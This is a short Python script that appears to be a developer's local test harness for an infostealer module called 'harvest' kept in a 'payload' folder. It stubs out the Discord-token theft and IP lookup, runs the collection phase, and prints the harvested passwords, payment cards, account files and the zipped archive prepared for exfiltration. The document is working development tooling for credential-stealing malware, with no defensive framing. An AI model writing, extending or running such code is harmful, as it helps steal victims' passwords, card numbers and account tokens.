"""Local check for the patched harvest: runs phase2 with the network bits
stubbed, prints the stage tree and the new aggregates. Not shipped."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent / "payload"))
import harvest as hv

hv._public_ip = lambda: "0.0.0.0"
hv._discord_tokens = lambda: []

report = hv.phase2({})
stage = hv._STAGE
print("stage:", stage)
files = sorted(f.relative_to(stage).as_posix() for f in stage.rglob("*") if f.is_file())
for name in files:
    print("  ", name)
print("totals:", report.get("totals"))
print("launchers:", report.get("launchers"))
print("--- all_passwords.txt ---")
p = stage / "all_passwords.txt"
print(p.read_text("utf-8")[:1200] if p.is_file() else "(none)")
print("--- all_cards.txt ---")
c = stage / "all_cards.txt"
print(c.read_text("utf-8")[:800] if c.is_file() else "(none)")
account_dir = stage / "accounts"
if account_dir.is_dir():
    for f in sorted(account_dir.iterdir()):
        print("---", f.name, "---")
        print(f.read_text("utf-8")[:600])
z = hv._archive()
print("archive:", z, z.stat().st_size, "bytes")
import zipfile
with zipfile.ZipFile(z) as zz:
    names = zz.namelist()
    print("entries:", len(names), "| first 5:", names[:5])
    print("index head:")
    print(zz.read("INDEX.txt").decode()[:400])
hv.shutil.rmtree(stage, ignore_errors=True)
z.unlink(missing_ok=True)
